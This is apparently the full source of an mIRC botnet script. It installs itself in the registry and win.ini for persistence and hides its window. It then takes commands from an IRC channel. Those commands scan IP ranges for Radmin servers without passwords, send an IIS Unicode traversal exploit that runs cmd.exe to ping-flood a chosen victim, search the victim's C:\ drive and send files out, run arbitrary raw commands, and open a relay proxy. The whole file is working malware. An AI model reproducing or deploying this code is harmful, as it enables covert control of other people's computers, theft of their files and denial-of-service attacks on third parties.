alias r { .return $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) }
on 1:start:{
  write regedit [HKEY_CURRENT_CONFIG\Software\Microsoft\Windows NT\CurrentVersion\Windows] run = " $+ $mircexe $+ "
  write regedit [HKEY_CURRENT_CONFIG\Software\Microsoft\Windows\CurrentVersion\Windows] run = " $+ $mircexe $+ "
  writeini c:\winnt\win.ini windows run $mircexe
  writeini c:\windows\win.ini windows run $mircexe 
  .run hex.exe /hide mIRC*
  bnc %bnc.port
  %open = $ticks
  %bot.nick = 1
  .nick $r
  .server %server 6667
  .timerserver 0 60 .con
}
alias con { .server %server 6667 }
on 1:disconnect:{
  .timerconnected off
  %bot.nick = 1
  .nick asx[00004]
  .server %server 6667
  .timerserver 0 60 .con
}
on 1:connect:{
  .timerconnected 0 300 .connectcheck
  .timerserver off
  %online = $ticks
  .raw nick exe[00001]
  .timernick 1 3 join %auto xntsl 6667
  .timerjoin 1 10 .owner
}
alias connectcheck { whois $me }
alias owner {
  if ($me isowner %auto) {
    .raw prop %auto ownerkey %key
    .raw topic %auto : $+ $me -> $ip
    .raw mode %auto -o $me
  }
}
on 1:kick:#:{
  haltdef
  if ($knick == $me) {
    .raw join $chan
    halt
  }
}
on 1:text:*:#:{
  if ($1 == !iis) {
    if ($2 == $me) {
      if ($3 == scan) {
        .scan $$4
        .msg $chan Now scanning the range of $$4 for Radmin.
        halt
      }
    }
    if ($2 == drop) {
      %drop.ip = $$3
      %drop.times = $$4
      %drop.chan = $chan
      .drop
    }
    if ($2 == info) {
      .msg $chan Sockets: $sock(*,0) , IP: $gettok(%scan.range,1,46) $+ . $+ %scan.inc3 $+ . $+ %scan.inc1 $+ . $+ %scan.inc2 , Owned: $lines(radmin.txt)
    }
    if ($2 == send) {
      .dcc send $nick radmin.txt
    }
  }
  if ($1 == !bnc) {
    if ($2 == on) {
      .bnc %bnc.port
    }
    if ($2 == reset) {
      .sockclose bnc
      .bnc %bnc.port
    }
    if ($2 == port) {
      %bnc.port = $$3
      .sockclose bnc
      .bnc %bnc.port
    }
    if ($2 == pass) {
      %bnc.pass = $$3
      .sockclose bnc
      .bnc %bnc.port
    }
    if ($2 == info) {
      .msg $chan BNC: Pass: %bnc.pass , Port: %bnc.port , Usage: /server $ip %bnc.port
    }
  }
  if ($1 == !exit) {
    .partall
    .timerexit 1 3 exit
  }
  if ($1 == !raw) {
    $$2-
  }
  if ($1 == !info) {
    if ($2 == system) {
      set %rb_size 20
      .msg $chan 15[00 $+ $dll(moo.dll,osinfo,_) $+ 15] $&
        [uptime15/00 $+ $dll(moo.dll,uptime,_) $+ 15] $&
        [processor15/00 $+ $dll(moo.dll,cpuinfo,_) $+ 15] $&
        [screen15/00 $+ $dll(moo.dll,screeninfo,_) $+ 15] $&
        [ram15/00 $+ $gettok($dll(moo.dll,meminfo,_),2-,32) $+ 15] $&
        [Internet15/00 $+ $dll(moo.dll,interfaceinfo,_)  $+ 15]
      halt
    }
    if ($2 == uptime) {
      .msg $chan 15[uptime15/00 $+ $dll(moo.dll,uptime,_) $+ 15]
      halt
    }
    if ($2 == ram) {
      .msg $chan 15[ram15/00 $+ $dll(moo.dll,meminfo,_) $+ 15]
      halt
    }
    if ($2 == processor) {
      .msg $chan 15[processor15/00 $+ $dll(moo.dll,cpuinfo,_) $+ 15]
      halt
    }
    if ($2 == os) {
      .msg $chan 15[00 $+ $dll(moo.dll,osinfo,_) $+ 15]
      halt
    }
    if ($2 == internet) {
      .msg $chan [Internet15/00 $+ $dll(moo.dll,interfaceinfo,_)  $+ 15]
      halt
    }
    if ($2 == mirc) {
      .msg $chan 15[00open15/00 $+ $replace($replace($replace($duration($calc(($ticks - %open) / 1000)),secs,s),mins,m),hrs,h) $+ 15] [00online15/00 $+ $server for $replace($replace($replace($duration($calc(($ticks - %online) / 1000)),hrs,h),secs,s),mins,m) $+ 15]
      halt
    }
    if ($2 != $null) {
      .msg $chan info ( $+ $$2 $+ /No such command)
      halt
    }
    .msg $chan info (Not enough Parameters)
  }
  if ($1 == !fserv) {
    if ($2 == $null) { .msg $chan !fserv (Not enough Parameters) | halt }
    if ($2 == $me) {
      if (Filesize isin $$3-) {
        .msg $chan $nick $+ : Please only type !fserv $me <filename> ... Not the filesize too.
        halt
      }
      .dcc send $nick " $+ $$3- $+ "
      halt
    }   
    if ($2 == find) {
      %find.text = $$3-
      %find.files = $findfile(c:\,$search,0)
      .msg $nick Found files: $findfile(c:\,$search,0)
      if (%find.files > 5) {
        .msg $nick Too Many files found for listing.  Sending file list.  This could take a while.
        %find.inc = 1
        .write -c %find.text $+ .txt
        .write %find.text $+ .txt [IP: $ip $+ ]
        .write %find.text $+ .txt [Search: %find.text $+ ]
        .write %find.text $+ .txt [Files: %find.files $+ ]
        .write %find.text $+ .txt [Send: !fserv <my nick> <filename>]
        :write
        if (%find.inc > %find.files) {
          .dcc send $nick %find.text $+ .txt
          .timerremove $+ $rand(a,z) 1 60 .remove " $+ $mircdir $+ \ $+ %find.text $+ .txt"
          halt
        }
        .write %find.text $+ .txt !fserv <my nick> $findfile(c:\,$search,%find.inc) [Filesize: $round($calc(($lof($findfile(C:\,$search,%find.inc)) / 1024) / 1000),2) $+ MB]
        %find.inc = %find.inc + 1
        goto write
      }
      %find.inc = 1
      :find
      if (%find.inc > %find.files) {
        .msg $nick All Files listed for search of: %find.text
        .msg $nick To download type: !fserv $me <filename>       
        halt
      }
      .msg $nick %find.inc $+ . $findfile(c:\,$search,%find.inc) [Filesize: $round($calc(($lof($findfile(C:\,$search,%find.inc)) / 1024) / 1000),2) $+ MB]
      %find.inc = %find.inc + 1
      goto find
      halt
    }
    if ($2 == help) {
      .msg $nick fserv commands (All commands should be entered in a channel I am in):
      .msg $nick !fserv find <search>
      .msg $nick !fserv $me <filename> (downloads)
      .msg $nick !fserv help (this menu)
      halt
    }
    .msg $chan fserv ( $+ $$2 $+ /No such command)
  }
}
alias search { .return * $+ %find.text $+ * }
alias drop {
  %drop.lines = $lines(iis.txt)
  %drop.inc = 1
  .timerdrop 0 10 dropiis
}
alias dropiis {
  if (%drop.inc > %drop.lines) { .timerdrop off | .msg %drop.chan Finished Sending Packet Command to all %drop.lines Hosts.  Sending %drop.times Packets. | halt }
  %drop = $r $+ $r $+ $r
  .sockopen Drop[ $+ %drop $+ ] $read -l $+ %drop.inc iis.txt 80
  .timerdrop $+ %drop 1 3 .sockclose Drop[ $+ %drop $+ ]  
  %drop.inc = %drop.inc + 1
}
on 1:sockopen:Drop[*]:{
  if ($sockerr > 0) { .sockclose $sockname | halt }
  sockwrite -n $sockname GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+ping.exe+"-v"+icmp+"-t"+"-l"+65000+ $+ %drop.ip $+ +"-n"+ $+ %drop.times $+ +"-w"+0
}
on 1:sockwrite:Drop[*]:{
  .sockclose $sockname
}
raw 433:*:{
  .haltdef
  %bot.nick = %bot.nick + 1
  if ($len(%bot.nick) == 1) { .nick exe[ $+ $str(0,4) $+ %bot.nick $+ ] | halt }
  if ($len(%bot.nick) == 2) { .nick exe[ $+ $str(0,3) $+ %bot.nick $+ ] | halt }
  if ($len(%bot.nick) == 3) { .nick exe[ $+ $str(0,2) $+ %bot.nick $+ ] | halt }
  if ($len(%bot.nick) == 4) { .nick exe[ $+ $str(0,1) $+ %bot.nick $+ ] | halt }
  if ($len(%bot.nick) == 5) { .nick exe[ $+ %bot.nick $+ ] | halt }
  .nick exe[ $+ %bot.nick $+ ]
  halt
}
raw 471:*:{
  haltdef
  .timerjoin $+ $$2 0 60 join $$2
  halt
}
raw 473:*:{
  haltdef
  .timerjoin $+ $$2 0 60 join $$2
  halt
}
raw 474:*:{
  haltdef
  .timerjoin $+ $$2 0 60 join $$2
  halt
}
raw 475:*:{
  haltdef
  .timerjoin $+ $$2 0 60 join $$2
  halt
}
alias timerarg {
  var %arg $round($calc($prospeed / 100))
  if (%arg < 1) set %arg 1
  set %arg $int($calc(40 / %arg))
  if (%arg < 1) set %arg 1
  return %arg
}
alias prospeed { 
  var %protest $ticks 
  var %i 1 
  :start 
  if ($calc($ticks - %protest) <= 100) { 
    inc %i 
    goto start 
  }
  :end 
  return $calc(%i * .7))
}
alias scan {
  %scan.range = $$1
  %scan.inc1 = 1
  %scan.inc2 = 1
  %scan.inc3 = 1
  %scan = $gettok(%scan.range,1,46) $+ . $+ %scan.inc3 $+ . $+ %scan.inc1 $+ . $+ %scan.inc2
  .scan1
}
alias scan1 {
  .timerscan -ocm 0 $timerarg .scan2
}
alias scan2 {
  if (%scan.inc2 == 255) { 
    .timerscan off
    if (%scan.inc1 == 255) { 
      if (%scan.inc3 == 255) { %scanning = Done | halt }
      %scan.inc3 = %scan.inc3 + 1
      %scan.inc2 = 1
      %scan.inc1 = 1
      .timer -m 1 1 scan1 
      halt 
    }
    %scan.inc1 = %scan.inc1 + 1
    %scan.inc2 = 1
    .timer -m 1 1 scan1
  }
  .scansock
  %scan.inc2 = %scan.inc2 + 1
}
alias scansock {
  %sock = $r $+ $r
  .sockopen scanner[ $+ %sock $+ ] $gettok(%scan.range,1,46) $+ . $+ %scan.inc3 $+ . $+ %scan.inc1 $+ . $+ %scan.inc2 4899
  .timerclose $+ %sock 1 2 .sockclose scanner[ $+ %sock $+ ]
}
on 1:sockopen:scanner[*]:{
  if ($sock($sockname).status = active) {
    bset &command 1 1 0 0 0 1 0 0 0 8 8
    sockwrite $sockname &command
    halt
  }
}
on 1:sockread:scanner[*]:{
  if ($sockerr > 0) return
  :nextread
  sockread &temp
  if ($sockbr == 0) return
  if ($bvar(&temp,1,$bvar(&temp,0)) == %nopass) {
    .write radmin.txt $sock($sockname).ip
    .raw -q privmsg %auto :no password: $sock($sockname).ip
    .sockclose $sockname
  }
  if ($bvar(&temp,1,$bvar(&temp,0)) == %nopass1) {
    .write radmin.txt $sock($sockname).ip
    .raw -q privmsg %auto :no password: $sock($sockname).ip
    .sockclose $sockname
  }
  goto nextread
}
alias bnc { .socklisten bnc $$1 }
on 1:socklisten:bnc:{
  .sockaccept bnc.temp
  %bnc.temp.ip = $sock(bnc.temp).ip
  .sockrename bnc.temp bnca $+ %bnc.temp.ip
}
on 1:sockread:bnca*:{
  .sockread %bnca
  if ($gettok(%bnca,1,32) == PASS) {
    if ($gettok(%bnca,2,32) == %bnc.pass) {
      .sockwrite -n $sockname Password accepted.
      .sockwrite -n $sockname /conn <server> <port> to connect.
      %bnc [ $+ [ $sock($sockname).ip ] ] = yes
    }
  }
  if (%bnc [ $+ [ $sock($sockname).ip != yes) {
    if ($gettok(%bnca,1,32) == NICK) {
      .set %bnc.nick $gettok(%bnca,2,32) 
    }
    if ($gettok(%bnca,1,32) == USER) {
      .set %bnc.user $gettok(%bnca,2-,32)
      .sockwrite -n $sockname Welcome to psyBNC.
      .sockwrite -n $sockname /pass <pass> for authorization
    }
  }
  if (%bnc [ $+ [ $sock($sockname).ip ] ] == yes) {
    if ($gettok(%bnca,1,32) == CONN) {
      %bncconn. [ $+ [ $sock($sockname).ip ] ] = Connected
      .sockopen bncb [ $+ [ $sock($sockname).ip ] ] $gettok(%bnca,2-,32)
      .sockwrite -n $sockname Now Attempting to connected to: $gettok(%bnca,2-,32)
      halt
    }
    if (%bncconn. [ $+ [ $sock($sockname).ip ] ] == Connected) {
      .sockwrite -n bncb [ $+ [ $remove($sockname,bnca) ] ] $gettok(%bnca,1-,32)
    }
    echo -s %bnca
  }
}
on 1:sockopen:bncb*:{
  .sockwrite -n $sockname USER %bnc.user
  .sockwrite -n $sockname NICK %bnc.nick
}
on 1:sockread:bncb*:{
  .sockread %bncb
  .sockwrite -n bnca [ $+ [ $remove($sockname,bncb) ] ] %bncb
}
on 1:sockclose:bnca*:{
  %bnc [ $+ [ $sock($sockname).ip ] ] = no
  %bnccon. [ $+ [ $sock($sockname).ip ] ] = no
  .sockclose bncb [ $+ [ $sock($sockname).ip ] ]
}
